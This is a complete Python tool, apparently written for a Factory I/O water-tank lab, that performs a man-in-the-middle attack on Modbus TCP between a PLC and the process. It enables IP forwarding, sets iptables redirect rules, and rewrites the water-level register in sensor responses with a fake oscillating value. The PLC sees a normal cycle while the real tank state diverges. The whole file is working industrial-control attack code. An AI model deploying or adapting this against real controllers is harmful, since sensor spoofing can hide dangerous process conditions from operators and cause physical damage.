#!/usr/bin/env python3
import socket
import threading
import struct
import logging
import os
import signal
import sys
import time

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.getLogger('modbus-mitm')

# ── Network config (confirmed from capture.pcapng) ────────────────────────────
LISTEN_HOST  = '0.0.0.0'
LISTEN_PORT  = 5030
TARGET_HOST  = '192.168.10.107'   # Factory I/O
TARGET_PORT  = 503                # Non-standard Modbus port

# ── PLC threshold constants (from Water_Tank.st) ──────────────────────────────
PLC_HIGH_THRESHOLD = 800    # SR0 SET point  → PLC starts draining
PLC_LOW_THRESHOLD  = 100    # SR1 SET point  → PLC starts filling

# ── Synthetic level generator ─────────────────────────────────────────────────
# This runs an independent fake water level cycle that the PLC will see.
# It oscillates between LOW_THRESHOLD and HIGH_THRESHOLD at a fixed rate,
# guaranteeing both SR latches toggle correctly regardless of what FIO is doing.
#
# CYCLE_STEP  : how many units the fake level changes per poll cycle
# CYCLE_DELAY : approximate seconds between PLC polls (from pcap: ~500ms per cycle)
SYNTHETIC_LOW   = 100    # Fake level floor  — triggers SR1 (fill)
SYNTHETIC_HIGH  = 800    # Fake level ceiling — triggers SR0 (drain)
CYCLE_STEP      = 5      # Units per poll (adjust to match observed real rate)

class SyntheticLevelGenerator:
    """
    Maintains an independent fake water level that oscillates between
    SYNTHETIC_LOW and SYNTHETIC_HIGH. The PLC sees this level and keeps
    its SR latches toggling normally.

    The generator tracks the REAL level from FIO to detect phase
    (filling vs draining) and mirrors that direction in the fake level,
    keeping them roughly in sync while allowing the timing to differ.
    """
    def __init__(self):
        self._lock          = threading.Lock()
        self._fake_level    = 450          # Start mid-range
        self._direction     = 1           # +1 = filling, -1 = draining
        self._real_level    = 450
        self._real_prev     = 450
        self._phase_history = []          # Last N real levels to detect trend

    def update_real(self, real_level: int):
        """Called each time a new real level is observed from FIO."""
        with self._lock:
            self._real_prev = self._real_level
            self._real_level = real_level
            self._phase_history.append(real_level)
            if len(self._phase_history) > 5:
                self._phase_history.pop(0)

            # Detect fill/drain phase from real level trend
            if len(self._phase_history) >= 3:
                trend = self._phase_history[-1] - self._phase_history[0]
                if trend > 0:
                    self._direction = 1    # Real tank is filling
                elif trend < 0:
                    self._direction = -1   # Real tank is draining

    def next_fake_level(self) -> int:
        """
        Advance the fake level by one step in the current direction.
        Bounces at SYNTHETIC_HIGH (triggers drain) and SYNTHETIC_LOW (triggers fill).
        Returns the new fake level to send to the PLC.
        """
        with self._lock:
            self._fake_level += self._direction * CYCLE_STEP

            # Hit the ceiling — reverse to draining
            if self._fake_level >= SYNTHETIC_HIGH:
                self._fake_level = SYNTHETIC_HIGH + 1  # Ensure > 800 to SET SR0
                self._direction = -1
                log.info(f'[SYNTH] Fake level hit HIGH ({self._fake_level}) → switching to DRAIN phase')

            # Hit the floor — reverse to filling
            elif self._fake_level <= SYNTHETIC_LOW:
                self._fake_level = SYNTHETIC_LOW - 1   # Ensure < 100 to SET SR1
                self._direction = 1
                log.info(f'[SYNTH] Fake level hit LOW ({self._fake_level}) → switching to FILL phase')

            return self._fake_level

    @property
    def real_level(self) -> int:
        with self._lock:
            return self._real_level

    @property
    def fake_level(self) -> int:
        with self._lock:
            return self._fake_level


# Global synthetic level generator — shared across all proxy sessions
synth = SyntheticLevelGenerator()

# ── Modbus function codes ─────────────────────────────────────────────────────
FC_READ_DISCRETE_INPUTS     = 0x02
FC_READ_HOLDING_REGISTERS   = 0x03
FC_READ_INPUT_REGISTERS     = 0x04
FC_WRITE_MULTIPLE_COILS     = 0x0F
FC_WRITE_MULTIPLE_REGISTERS = 0x10

# ── Packet helpers ────────────────────────────────────────────────────────────
def parse_mbap(data: bytes) -> dict | None:
    """Parse 8-byte MBAP header: TxID(2) ProtoID(2) Length(2) UnitID(1) FC(1)."""
    if len(data) < 8:
        return None
    tx_id, proto_id, length, unit_id, fc = struct.unpack('>HHHBB', data[:8])
    return {
        'tx_id': tx_id, 'proto_id': proto_id, 'length': length,
        'unit_id': unit_id, 'fc': fc, 'payload': data[8:]
    }

def rebuild_packet(hdr: dict, new_payload: bytes) -> bytes:
    """Rebuild Modbus TCP frame with updated payload and corrected length field."""
    new_length = 2 + len(new_payload)   # UnitID(1) + FC(1) + PDU
    mbap = struct.pack('>HHHB', hdr['tx_id'], hdr['proto_id'], new_length, hdr['unit_id'])
    return mbap + bytes([hdr['fc']]) + new_payload

# ── Manipulation: FIO → PLC ───────────────────────────────────────────────────
def manipulate_fio_to_plc(data: bytes) -> bytes:
    """
    Intercept FC04 (Read Input Registers) responses from Factory I/O.
    Replace the real water level (register 0) with a synthetic level that
    keeps the PLC SR latches oscillating normally.
    All other function codes pass through unchanged.
    """
    pkt = parse_mbap(data)
    if not pkt:
        return data

    fc      = pkt['fc']
    payload = pkt['payload']

    if fc == FC_READ_INPUT_REGISTERS and len(payload) >= 3:
        byte_cnt = payload[0]
        num_regs = byte_cnt // 2

        if byte_cnt % 2 != 0 or len(payload) < 1 + byte_cnt:
            return data  # Malformed — pass through

        registers = list(struct.unpack(f'>{num_regs}H', payload[1:1 + byte_cnt]))
        real_level = registers[0]

        # Feed real level into synthetic generator to track phase
        synth.update_real(real_level)

        # Get next synthetic level for the PLC
        fake_level = synth.next_fake_level()

        log.warning(
            f'[FC04 MANIPULATE] real={real_level:>4}  →  fake={fake_level:>4}  '
            f'(FIO phase: {"FILL" if synth._direction > 0 else "DRAIN"})'
        )

        registers[0] = fake_level
        new_payload = bytes([byte_cnt]) + struct.pack(f'>{num_regs}H', *registers)
        return rebuild_packet(pkt, new_payload)

    # Log FC03 holding register responses (setpoints) — pass through unchanged
    if fc == FC_READ_HOLDING_REGISTERS and len(payload) >= 3:
        byte_cnt = payload[0]
        num_regs = byte_cnt // 2
        if len(payload) >= 1 + byte_cnt:
            regs = struct.unpack(f'>{num_regs}H', payload[1:1 + byte_cnt])
            log.debug(f'[FC03 passthru] Holding regs (FV/DV setpoints): {list(regs)}')

    return data


# ── Manipulation: PLC → FIO ───────────────────────────────────────────────────
def manipulate_plc_to_fio(data: bytes) -> bytes:
    """
    Pass all PLC write commands to Factory I/O unchanged.
    The PLC's valve commands (FC16) and coil writes (FC0F) must reach FIO
    unmodified so the physical simulation continues normally.
    We log them here for visibility.
    """
    pkt = parse_mbap(data)
    if not pkt:
        return data

    fc      = pkt['fc']
    payload = pkt['payload']

    if fc == FC_WRITE_MULTIPLE_REGISTERS and len(payload) >= 5:
        ref, count, byte_cnt = struct.unpack('>HHB', payload[:5])
        if len(payload) >= 5 + byte_cnt:
            regs = struct.unpack(f'>{byte_cnt // 2}H', payload[5:5 + byte_cnt])
            fv = regs[0] if len(regs) > 0 else '?'
            dv = regs[1] if len(regs) > 1 else '?'
            log.info(
                f'[FC16 passthru] PLC→FIO  FV(fill)={fv}  DV(drain)={dv}  '
                f'(real_level={synth.real_level}  fake_level={synth.fake_level})'
            )

    elif fc == FC_WRITE_MULTIPLE_COILS and len(payload) >= 5:
        ref, count, byte_cnt = struct.unpack('>HHB', payload[:5])
        coil_data = payload[5:5 + byte_cnt]
        log.debug(f'[FC0F passthru] PLC→FIO WriteCoils: start={ref} data={coil_data.hex()}')

    elif fc == FC_READ_INPUT_REGISTERS and len(payload) == 4:
        ref, cnt = struct.unpack('>HH', payload)
        log.debug(f'[FC04 request ] PLC→FIO ReadInputRegs: start={ref} count={cnt}')

    return data  # ALL PLC→FIO traffic forwarded unmodified


# ── TCP stream frame reassembly ───────────────────────────────────────────────
def forward(src: socket.socket, dst: socket.socket, label: str, transform=None):
    """
    Relay a TCP stream from src to dst, processing complete Modbus frames.
    Buffers partial reads to handle TCP fragmentation correctly.
    """
    buf = b''
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                break
            buf += chunk

            while len(buf) >= 6:
                # MBAP length field at bytes 4-5 covers UnitID + FC + PDU
                _, _, length = struct.unpack('>HHH', buf[:6])
                total = 6 + length

                if len(buf) < total:
                    break  # Wait for rest of frame

                frame = buf[:total]
                buf   = buf[total:]

                if transform:
                    frame = transform(frame)

                dst.sendall(frame)

    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        log.debug(f'[{label}] Closed: {e}')
    finally:
        try: src.close()
        except: pass
        try: dst.close()
        except: pass


# ── Session handler ───────────────────────────────────────────────────────────
def handle_client(client_sock: socket.socket, client_addr: tuple):
    log.info(f'[+] PLC connected from {client_addr}')
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.settimeout(10)
        server_sock.connect((TARGET_HOST, TARGET_PORT))
        server_sock.settimeout(None)
        log.info(f'[+] Proxying → Factory I/O {TARGET_HOST}:{TARGET_PORT}')
    except Exception as e:
        log.error(f'[-] Cannot reach Factory I/O: {e}')
        client_sock.close()
        return

    # PLC → FIO: actuator commands pass through unmodified
    t1 = threading.Thread(
        target=forward,
        args=(client_sock, server_sock, 'PLC→FIO', manipulate_plc_to_fio),
        daemon=True
    )
    # FIO → PLC: sensor responses intercepted — water level replaced with synthetic
    t2 = threading.Thread(
        target=forward,
        args=(server_sock, client_sock, 'FIO→PLC', manipulate_fio_to_plc),
        daemon=True
    )

    t1.start()
    t2.start()
    t1.join()
    t2.join()
    log.info(f'[-] Session closed: {client_addr}')


# ── iptables setup ────────────────────────────────────────────────────────────
def setup_iptables():
    rules = [
        'iptables -t nat -F PREROUTING',
        'iptables -F FORWARD',
        # Redirect PLC requests to proxy
        f'iptables -t nat -A PREROUTING -p tcp -s 192.168.10.100 --dport {TARGET_PORT} -j REDIRECT --to-port {LISTEN_PORT}',
        # Redirect FIO responses back through proxy
        f'iptables -t nat -A PREROUTING -p tcp -s {TARGET_HOST} --sport {TARGET_PORT} -j REDIRECT --to-port {LISTEN_PORT}',
        f'iptables -A FORWARD -p tcp --dport {TARGET_PORT} -j ACCEPT',
        f'iptables -A FORWARD -p tcp --sport {TARGET_PORT} -j ACCEPT',
    ]
    for r in rules:
        ret = os.system(r)
        status = 'OK' if ret == 0 else 'FAILED'
        log.info(f'[iptables] [{status}] {r}')

def teardown_iptables():
    os.system('iptables -t nat -F PREROUTING')
    os.system('iptables -F FORWARD')
    log.info('[iptables] Rules cleared')


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    log.info('=' * 65)
    log.info('  Modbus TCP MitM Proxy — SR Latch-Aware Water Tank Attack')
    log.info(f'  Target   : {TARGET_HOST}:{TARGET_PORT}')
    log.info(f'  Listener : {LISTEN_HOST}:{LISTEN_PORT}')
    log.info(f'  Strategy : Synthetic level {SYNTHETIC_LOW}↔{SYNTHETIC_HIGH} (step={CYCLE_STEP})')
    log.info(f'  PLC sees : Normal 100→800→100 cycle (SR latches toggle correctly)')
    log.info(f'  FIO sees : Real actuator commands (physical simulation unaffected)')
    log.info('=' * 65)

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    log.info('[*] IP forwarding enabled')

    setup_iptables()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(20)
    log.info(f'[*] Proxy listening on {LISTEN_HOST}:{LISTEN_PORT}')
    log.info('[*] Waiting for PLC connection...')

    def shutdown(sig, frame):
        log.info('[*] Shutting down...')
        teardown_iptables()
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
        srv.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)

    while True:
        try:
            client_sock, client_addr = srv.accept()
            t = threading.Thread(
                target=handle_client,
                args=(client_sock, client_addr),
                daemon=True
            )
            t.start()
        except OSError:
            break

if __name__ == '__main__':
    if os.geteuid() != 0:
        print('[!] Must run as root')
        sys.exit(1)
    main()
